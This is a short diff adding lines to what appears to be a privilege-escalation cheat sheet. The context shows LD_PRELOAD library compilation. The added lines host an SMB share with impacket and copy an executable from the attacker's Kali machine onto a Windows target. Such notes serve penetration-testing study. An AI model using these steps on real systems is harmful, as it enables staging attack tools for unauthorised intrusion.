@@ -569,3 +569,8 @@ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
 print the shared libraries used by a program:
 ldd /usr/sbin/apache2
 
+Upload file on windows using smb shares:
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . #host the pwd named as kali as a smb share
+
+On Windows:
+copy \\<ip of your kali machine>\kali\yourfile.exe C:\PrivEsc\yourfile.exe
